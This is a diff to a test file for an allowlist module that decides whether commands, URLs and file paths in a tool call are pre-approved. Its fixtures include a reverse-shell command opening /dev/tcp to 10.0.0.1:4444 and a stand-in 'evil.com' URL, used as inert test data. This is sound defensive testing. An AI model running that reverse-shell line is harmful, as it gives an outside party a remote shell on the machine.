@@ -1,10 +1,11 @@
 import { readFile, writeFile } from "node:fs/promises";
-import { join } from "node:path";
+import { join, resolve } from "node:path";
 import { describe, expect, it } from "vitest";
 import {
 	addCommand,
 	addFilePath,
 	addUrl,
+	allowlistedArtifacts,
 	emptyAllowlist,
 	isAllowlisted,
 	loadAllowlist,
@@ -120,14 +121,25 @@ describe("isAllowlisted", () => {
 		expect(isAllowlisted(al, artifacts)).toBe(true);
 	});
 
-	it("matches an allowlisted command even when URLs are also present", () => {
+	it("an allowlisted command covers the URLs extracted from it", () => {
 		const al = emptyAllowlist();
-		addCommand(al, "safe command", "approved", "deny");
+		addCommand(al, "curl -s http://internal.example/x", "approved", "deny");
 		const artifacts: Artifact[] = [
-			{ type: "command", value: "safe command" },
-			{ type: "url", value: "http://evil.com" },
+			{ type: "command", value: "curl -s http://internal.example/x" },
+			{ type: "url", value: "http://internal.example/x" },
 		];
 		expect(isAllowlisted(al, artifacts)).toBe(true);
+	});
+
+	it("an allowlisted command does not cover an unrelated artifact", () => {
+		const al = emptyAllowlist();
+		addCommand(al, "safe command", "approved", "deny");
+		const unrelated: Artifact = { type: "url", value: "http://evil.com" };
+		const artifacts: Artifact[] = [{ type: "command", value: "safe command" }, unrelated];
+		expect(isAllowlisted(al, artifacts)).toBe(false);
+		const covered = allowlistedArtifacts(al, artifacts);
+		expect(covered.has(unrelated)).toBe(false);
+		expect(covered.size).toBe(1);
 	});
 
 	it("returns false when not allowlisted", () => {
@@ -191,6 +203,47 @@ describe("file path allowlisting", () => {
 		expect(isAllowlisted(al, artifacts)).toBe(true);
 	});
 
+	it("one allowlisted file path does not clear a multi-artifact call", () => {
+		const al = emptyAllowlist();
+		addFilePath(al, "/proj/run.sh", "fp", "ask");
+		const path: Artifact = { type: "file_path", value: "/proj/run.sh" };
+		const command: Artifact = { type: "command", value: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" };
+		expect(isAllowlisted(al, [path, command])).toBe(false);
+		const covered = allowlistedArtifacts(al, [path, command]);
+		expect(covered.has(path)).toBe(true);
+		expect(covered.has(command)).toBe(false);
+	});
+
+	it("resolves relative entries against the working directory", () => {
+		const al = emptyAllowlist();
+		al.filePaths["run.sh"] = {
+			addedAt: "2026-01-01T00:00:00Z",
+			reason: "fp",
+			originalVerdict: "ask",
+		};
+		const projectA = resolve("/projA");
+		const projectB = resolve("/projB");
+		const relative: Artifact = { type: "file_path", value: "run.sh" };
+		// The relative entry names <cwd>/run.sh only.
+		expect(isAllowlisted(al, [relative], projectA)).toBe(true);
+		expect(
+			isAllowlisted(al, [{ type: "file_path", value: join(projectA, "run.sh") }], projectA),
+		).toBe(true);
+		expect(
+			isAllowlisted(al, [{ type: "file_path", value: join(projectA, "run.sh") }], projectB),
+		).toBe(false);
+		expect(
+			isAllowlisted(al, [{ type: "file_path", value: "/elsewhere/sub/run.sh" }], projectA),
+		).toBe(false);
+	});
+
+	it("stores a relative path resolved against the current directory", () => {
+		const al = emptyAllowlist();
+		addFilePath(al, "relative/run.sh", "fp", "ask");
+		expect(Object.keys(al.filePaths)).toEqual([normalizeFilePath(resolve("relative/run.sh"))]);
+		expect(removeFilePath(al, "relative/run.sh")).toBe(true);
+	});
+
 	it("removeFilePath removes entry", () => {
 		const al = emptyAllowlist();
 		addFilePath(al, "/tmp/test.env", "approved", "ask");
@@ -211,7 +264,7 @@ describe("file path allowlisting", () => {
 		await saveAllowlist(al, makeConfig(path));
 
 		const loaded = await loadAllowlist(makeConfig(path));
-		const normalized = normalizeFilePath("/tmp/test.env");
+		const normalized = normalizeFilePath(resolve("/tmp/test.env"));
 		expect(loaded.filePaths[normalized]).toBeDefined();
 		expect(loaded.filePaths[normalized]?.reason).toBe("approved");
 	});
